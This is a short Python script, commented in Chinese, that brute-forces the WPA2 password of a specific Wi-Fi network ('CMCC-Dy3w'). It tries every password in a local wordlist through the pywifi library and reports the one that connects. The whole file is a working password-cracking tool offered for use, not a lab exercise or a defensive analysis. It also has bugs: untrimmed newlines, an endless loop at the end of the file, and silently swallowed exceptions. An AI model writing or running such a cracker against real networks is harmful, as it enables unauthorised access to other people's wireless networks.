from pywifi import *
import sys
import time
import pywifi
from datetime import datetime
import datetime
# 测试连接，返回连接结果
def wificonnect(pwd):
    # 获取网卡接口
    wifi = pywifi.PyWiFi()
    # 获取第一个无线网卡
    ifaces = wifi.interfaces()[0]
    # 断开wifi连接
    ifaces.disconnect()
    # 睡眠
    time.sleep(1)
    # 获取网卡的连接状态
    wifistatus = ifaces.status()

    # 判断是否真的断开连接了
    if wifistatus == const.IFACE_DISCONNECTED:
        # print("当前未连接wifi！")
        # 创建wifi链接文件
        profile = pywifi.Profile()
        # 定义要连接的wifi的名称
        profile.ssid = "CMCC-Dy3w"
        # 网卡开放
        profile.auth = const.AUTH_ALG_OPEN
        # wifi加密算法
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # 密码
        profile.key = pwd
        # 进行连接之前删除所有的wifi连接文件
        ifaces.remove_all_network_profiles()
        # 设定新的链接文件
        tcp_profile = ifaces.add_network_profile(profile)
        # 新的连接文件测试连接
        ifaces.connect(tcp_profile)
        # wifi连接的时间
        time.sleep(4)

        # 连接之后，判断状态
        if ifaces.status() == const.IFACE_CONNECTED:
            # 如果连接成功了就返回True
            return True
        else:
            return False
    else:
        print("当前已经连接到wifi！")


# 读取密码本
def readpassword():
    print("已经准备好，开始破解wifi")
    path = "E:\\password.txt"

    # 以只读的形式打开文件
    file = open(path, "r")
    # 打印出开始尝试密码连接的时间
    print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S" ))
    while True:
        try:
            # readline 每次读取一行密码
            passwd = file.readline()
            # 调用wifi连接的函数
            bool = wificonnect(passwd)
            if bool:
                print("密码正确", passwd)
                print(datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"))
                # 跳出当前循环
                break
            else:
                print("密码不正确！", passwd)
        except:
            # 跳出当前循环，进行下次循环
            continue

readpassword()